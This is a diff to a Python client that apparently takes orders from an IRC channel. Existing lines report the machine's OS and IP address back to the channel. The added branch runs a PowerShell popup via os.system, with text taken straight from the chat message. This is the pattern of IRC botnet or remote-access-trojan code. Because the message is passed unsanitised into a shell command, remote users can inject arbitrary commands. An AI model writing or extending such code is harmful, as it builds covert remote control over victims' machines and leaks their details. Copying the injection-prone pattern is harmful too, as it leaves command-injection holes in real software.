@@ -87,6 +87,13 @@ def main():
                             chat(s, clientName + " is running " + osInfo + ". The IP address is " + socket.gethostbyname(socket.gethostname()))
                         except Exception as e:
                             chat(s, clientName + " encountered an error. " + str(e))
+                    elif messageArray[2] == 'mbox':
+                        try:
+                            command = 'powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(messageArray[3])
+                            os.system(command)
+                            chat(s, clientName + " completed the command.")
+                        except Exception as e:
+                            chat(s, clientName + " encountered an error. " + str(e))
                     else:
                         chat(s, "Incorrect command usage.")
         sleep(1)
@@ -95,3 +102,4 @@ def chat(sock, msg):
     sock.send("PRIVMSG {} :{}".format(CHAN, msg+"\r\n").encode())
 
 main()
+
